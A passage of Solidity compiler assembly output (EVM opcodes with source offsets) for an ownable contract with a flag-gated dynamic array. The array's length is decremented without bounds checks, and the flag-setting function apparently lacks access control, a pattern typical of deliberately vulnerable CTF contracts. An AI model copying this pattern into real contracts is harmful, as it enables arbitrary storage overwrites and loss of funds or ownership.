											"name": "CALLDATASIZE"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "ADD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "ADD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP3"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "MLOAD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP3"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "MSTORE"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "ADD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "MLOAD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SUB"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "RETURN"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "JUMPDEST"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SWAP3"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SWAP2"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "POP"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "POP"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "POP"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "JUMPDEST"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "STOP"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "JUMPDEST"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "DUP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "DUP2"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "ADD"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SWAP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "DUP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "DUP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "AND"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SWAP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "ADD"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SWAP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SWAP3"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SWAP2"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "SWAP1"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "POP"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "POP"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "POP"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "JUMPDEST"
										},
										{
											"begin": 683,
											"end": 790,
											"name": "STOP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "JUMPDEST"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SLOAD"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "EXP"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "DIV"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "AND"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "JUMPI"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "INVALID"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "JUMPDEST"
										},
										{
											"begin": 620,
											"end": 628,
											"name": "DUP1"
										},
										{
											"begin": 609,
											"end": 614,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 615,
											"end": 616,
											"name": "DUP4"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "DUP2"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "SLOAD"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "DUP2"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "LT"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "JUMPI"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "INVALID"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "JUMPDEST"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "SWAP1"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "MSTORE"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "KECCAK256"
										},
										{
											"begin": 609,
											"end": 617,
											"name": "ADD"
										},
										{
											"begin": 609,
											"end": 628,
											"name": "DUP2"
										},
										{
											"begin": 609,
											"end": 628,
											"name": "SWAP1"
										},
										{
											"begin": 609,
											"end": 628,
											"name": "SSTORE"
										},
										{
											"begin": 609,
											"end": 628,
											"name": "POP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "POP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "POP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "JUMPDEST"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SWAP1"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SLOAD"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SWAP1"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "EXP"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SWAP1"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "DIV"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "AND"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "DUP2"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "JUMPDEST"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SLOAD"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "EXP"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "DIV"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "AND"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "JUMPI"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "INVALID"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 284,
											"end": 299,
											"name": "JUMPDEST"
										},
										{
											"begin": 517,
											"end": 522,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "DUP1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SLOAD"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "DUP1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SWAP2"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SWAP1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SWAP1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SUB"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SWAP2"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "SWAP1"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "JUMPDEST"
										},
										{
											"begin": 517,
											"end": 531,
											"name": "POP"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "JUMPDEST"
										},
										{
											"begin": 369,
											"end": 373,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 359,
											"end": 366,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 359,
											"end": 366,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "EXP"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "DUP2"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "SLOAD"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "DUP2"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "MUL"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "NOT"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "AND"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "SWAP1"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "DUP4"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "ISZERO"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "ISZERO"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "MUL"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "OR"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "SWAP1"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "SSTORE"
										},
										{
											"begin": 359,
											"end": 373,
											"name": "POP"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "JUMPDEST"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "PUSH [tag]",
											"value": "50"
										},
										{
											"begin": 410,
											"end": 417,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "tag",
											"value": "50"
										},
										{
											"begin": 410,
											"end": 419,
											"name": "JUMPDEST"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "JUMPI"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "DUP1"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "REVERT"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 402,
											"end": 420,
											"name": "JUMPDEST"
										},
										{
											"begin": 638,
											"end": 639,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "AND"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "DUP1"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "SWAP1"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "SLOAD"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "SWAP1"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "EXP"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "SWAP1"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "DIV"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 622,
											"end": 628,
											"name": "AND"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "AND"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "PUSH",
											"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "MLOAD"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "MLOAD"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "DUP1"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "SWAP2"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "SUB"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "SWAP1"
										},
										{
											"begin": 601,
											"end": 641,
											"name": "LOG3"
										},
										{
											"begin": 668,
											"end": 669,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 651,
											"end": 657,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 657,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "EXP"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "DUP2"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "SLOAD"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "DUP2"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "MUL"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "NOT"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "AND"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "SWAP1"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "DUP4"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "AND"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "MUL"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "OR"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "SWAP1"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "SSTORE"
										},
										{
											"begin": 651,
											"end": 670,
											"name": "POP"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "JUMPDEST"
										},
										{
											"begin": 326,
											"end": 333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "DUP1"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "SWAP1"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "SLOAD"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "SWAP1"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "EXP"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "SWAP1"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "DIV"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 352,
											"end": 358,
											"name": "AND"
										},
										{
											"begin": 345,
											"end": 358,
											"name": "SWAP1"
										},
										{
											"begin": 345,
											"end": 358,
											"name": "POP"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "SWAP1"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "JUMPDEST"
										},
										{
											"begin": 484,
											"end": 488,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "DUP1"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "SWAP1"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "SLOAD"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "SWAP1"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "EXP"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "SWAP1"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "DIV"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 521,
											"end": 527,
											"name": "AND"
										},
										{
											"begin": 507,
											"end": 527,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 507,
											"end": 527,
											"name": "AND"
										},
										{
											"begin": 507,
											"end": 517,
											"name": "CALLER"
										},
										{
											"begin": 507,
											"end": 527,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 507,
											"end": 527,
											"name": "AND"
										},
										{
											"begin": 507,
											"end": 527,
											"name": "EQ"
										},
										{
											"begin": 500,
											"end": 527,
											"name": "SWAP1"
										},
										{
											"begin": 500,
											"end": 527,
											"name": "POP"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "SWAP1"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SLOAD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "LT"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMPI"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "INVALID"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "tag",
											"value": "55"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "MSTORE"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "KECCAK256"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "ADD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "SLOAD"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 385,
											"end": 468,
											"name": "JUMPDEST"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SLOAD"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "EXP"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "DIV"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 291,
											"end": 298,
											"name": "AND"
										},
										{
											"begin": 284,
											"end": 299,
